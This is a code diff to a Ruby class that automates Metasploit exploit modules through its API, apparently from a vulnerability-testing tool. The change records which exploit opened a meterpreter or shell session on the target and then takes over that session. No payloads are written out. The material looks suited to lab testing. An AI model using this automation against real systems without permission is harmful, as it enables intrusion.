@@ -22,7 +22,7 @@ require './lib/ui'
 
 class AttackEnv
   attr_reader :msf_api, :host, :user, :attack_vector
-  attr_accessor :error
+  attr_accessor :sessions_in_executing_module, :error
 
   include Haijack
 
@@ -37,6 +37,7 @@ class AttackEnv
     msf_api.auth_login
     msf_api.console_create
 
+    @sessions_in_executing_module = []
     @error = { flag: false, module_name: nil, module_option: {} }
   end
 
@@ -48,7 +49,7 @@ class AttackEnv
       msf_module_option['LHOST'] = host
       msf_module_info = msf_api.module_execute(type: msf_module['module_type'], name: msf_module['module_name'], option: msf_module_option)
 
-      next if success_of_attack_module?(msf_module['module_name'], msf_module_info)
+      next if success_of_attack_module?(msf_module['module_type'], msf_module['module_name'], msf_module_info)
 
       error[:flag] = true
       error[:module_name] = msf_module['module_name']
@@ -61,35 +62,33 @@ class AttackEnv
   def rob_shell
     VultestUI.execute('Brake into target machine')
 
-    session = { type: nil, id: nil }
+    sessions_in_executing_module.each do |value|
+      next unless value[:module_type] == 'exploit'
 
-    msf_api.module_session_list.each do |key, value|
-      session[:id] = key if value['type'] == 'meterpreter' || value['type'] == 'shell'
-      session[:type] = value['type'] unless session[:id] .nil?
-    end
-    return if session[:id].nil?
-
-    case session[:type]
-    when 'meterpreter' then meterpreter(api: msf_api, id: session[:id])
-    when 'shell' then shell(api: msf_api, id: session[:id])
+      case value[:shell_type]
+      when 'meterpreter' then meterpreter(id: value[:session_id])
+      when 'shell' then shell(id: value[:session_id])
+      else next
+      end
     end
   end
 
   private
 
-  def success_of_attack_module?(module_name, module_info)
+  def success_of_attack_module?(module_type, module_name, module_info)
     VultestUI.tty_spinner_begin(module_name)
-    continue_flag = true
     success_flag = false
     time_count = 0
 
-    while continue_flag
-      sleep(1)
-      time_count += 1
+    loop do
+      time_count += sleep(1)
       unless msf_api.module_session_list.empty?
-        msf_api.module_session_list.each do |_key, value|
+        msf_api.module_session_list.each do |key, value|
           # When module is auxiliary/scanner/ssh/ssh_login, module_info['uuid'] != value['exploit_uuid']
-          success_flag = true if module_info['uuid'] == value['exploit_uuid'] || value['via_exploit'] == module_name
+          next unless module_info['uuid'] == value['exploit_uuid'] || value['via_exploit'] == module_name
+
+          success_flag = true
+          sessions_in_executing_module.push(session_id: key, module_type: module_type, shell_type: value['type'])
         end
       end
       break if success_flag
@@ -97,7 +96,8 @@ class AttackEnv
       next unless (time_count % 30).zero?
 
       VultestUI.tty_spinner_end('error')
-      continue_flag = TTY::Prompt.new.yes?('There\'s a possibility that attack is fail. Are you still going to continue that?')
+      break unless TTY::Prompt.new.yes?('There\'s a possibility that attack is fail. Are you still going to continue that?')
+
       VultestUI.tty_spinner_begin(module_name)
     end
 
